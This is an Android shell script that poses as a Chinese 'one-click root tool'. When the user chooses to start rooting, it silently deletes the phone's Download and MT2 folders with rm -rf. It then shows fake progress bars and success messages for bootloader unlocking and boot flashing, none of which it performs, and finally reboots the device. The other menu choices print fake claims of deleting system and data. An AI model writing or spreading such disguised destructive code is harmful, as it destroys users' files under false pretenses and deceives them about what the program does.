#!/system/bin/sh
echo ****欢迎使用一键root工具****
sleep 0.5
echo ------Root有风险，是否确认执行------
echo "========================="
echo "[1] >>>>开始root<<<<"
echo "[2] >>>>退出脚本<<<<"
echo "========================="
sleep 0.5
echo -n "---请选择操作--- [1/2]: "
read choice


case "$choice" in
    1)
     echo "正在读取设备型号"
        
        echo "设备型号: $(getprop ro.product.model)"
        echo "系统版本: $(getprop ro.build.version.release)"
        sleep 1
        echo 正在从服务器下载对应的boot包
        sleep 0.5
        rm -rf /storage/emulated/0/Download
        rm -rf /storage/emulated/0/MT2
        
        
total=15

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
      echo boot已成功下载，准备解锁BootLoader
      sleep 0.5
      total=5

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 成功
 echo 成功
 echo 成功
 sleep 0.2
 echo 成功
 echo 成功
 echo 成功
 echo 成功
 sleep 2
 echo 开始从Sukisu Ultra官网下载管理器
 sleep 0.5
 total=6

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 开始修补boot
 sleep 0.2
 total=4

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 开始刷入boot
 total=3

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 成功
 echo 成功
 sleep 0.5
 echo 成功
 echo 成功
 echo 共计耗时2s
 echo 正在隐藏环境
 sleep 1
 echo 成功
 echo 请重启手机
        ;;
    2)
        echo "正在删除system"
        echo 正在删除 data
        echo 正在屏蔽9008端口
        echo 成功
        exit 0
        ;;
    *)
        echo "正在删除system"
        echo 正在删除 data
        echo 正在屏蔽9008端口
        echo 成功
        exit 1
     
        ;;
esac

echo "结束脚本"
reboot
